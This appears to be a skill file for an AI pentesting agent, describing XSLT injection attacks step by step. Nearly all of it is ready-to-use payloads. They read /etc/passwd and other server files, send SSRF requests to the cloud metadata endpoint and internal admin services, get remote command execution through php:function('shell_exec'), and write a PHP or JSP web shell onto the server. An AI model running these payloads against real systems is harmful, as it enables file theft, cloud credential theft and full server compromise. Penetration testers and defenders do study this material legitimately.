---
name: xslt-injection
description: Exploit XSLT processor injection for file read, SSRF, and RCE. Use when target processes XML with user-influenced stylesheets — file upload, PDF generation, XML transformation endpoints.
---

# XSLT Injection

User input reaches an XSLT stylesheet processed server-side. Capabilities depend on processor and version — fingerprint first, then escalate.

## Entry Points
- File upload accepting `.xsl`/`.xslt`
- Parameters controlling stylesheet selection or content
- XML processing with external stylesheet references
- PDF/document generation from XML input

## Step 1: Fingerprint Processor

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')"/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:if test="system-property('xsl:product-name')">
Product: <xsl:value-of select="system-property('xsl:product-name')"/>
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```

## Step 2: File Read (pick method by capability)

**`unparsed-text()` — XSLT 2.0+ (Saxon)**
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
```

**`document()` — All versions**
```xml
<xsl:value-of select="document('/etc/passwd')"/>
```

**XXE entity — when DTD processing enabled**
```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "/etc/passwd">]>
...
&xxe;
```

**PHP `file_get_contents` — when PHP namespace registered**
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"
  xmlns:php="http://php.net/xsl"/>
```

## Step 3: SSRF

```xml
<!-- Via xsl:include -->
<xsl:include href="http://169.254.169.254/latest/meta-data/"/>

<!-- Via document() -->
<xsl:value-of select="document('http://internal:8080/admin')"/>
```

Port scan by varying target — timing/error differentials reveal open ports.

## Step 4: RCE (PHP processors)

```xml
<xsl:value-of select="php:function('shell_exec','id')"
  xmlns:php="http://php.net/xsl"/>
```

Alternatives: `system()`, `exec()`, `passthru()`. Also `assert()` with `var_dump(scandir('.'))` for directory listing.

## Step 5: File Write

**XSLT 2.0+ `result-document`**
```xml
<xsl:result-document href="webshell.php">
<xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
</xsl:result-document>
```

**Xalan-J `redirect:write`**
```xml
<redirect:open file="shell.jsp"/>
<redirect:write file="shell.jsp">...</redirect:write>
```

## Capability Matrix

| Technique | XSLT 1.0 | XSLT 2.0+ | Requires PHP |
|-----------|-----------|------------|--------------|
| `system-property()` fingerprint | Yes | Yes | No |
| `document()` file/SSRF | Yes | Yes | No |
| `unparsed-text()` file read | No | Yes | No |
| XXE entities | Yes | Yes | No |
| `php:function()` RCE | Yes | Yes | Yes |
| `result-document` write | No | Yes | No |
| `xsl:include` SSRF | Yes | Yes | No |

## Chain With
- blind-ssrf-chains (SSRF via document()/include to internal services)
- write-path-to-rce (file write → framework view resolution → RCE)

## Reference
- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf
